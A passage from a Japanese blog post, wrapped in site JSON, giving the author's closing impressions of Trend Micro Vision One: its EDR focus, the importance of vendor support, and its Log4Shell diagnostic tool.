Vision Oneについて、各機能の使い勝手は分かりませんが、EDRを軸にセキュリティ機能を固めているようです。EDRについては完全自動化というのは無理でしょうから、どのくらいサポートがあるかで製品の価値がかわってくるものと思います。Log4Shell診断ツールの使い勝手は分かりましたが、コンソール画面上の他の機能を見る限りどの程度便利かはよく分かりませんでした。"},"name":"[2022-01-01]Trend Micro Vision Oneを試してみる","tags":["security","trend-micro-vision-one"],"childPublishedDate":{"published_on":"2022-01-01T00:00:00.000Z","published_on_unix":1640995200}}}]}},"pageContext":{"number":90}},"staticQueryHashes":[]}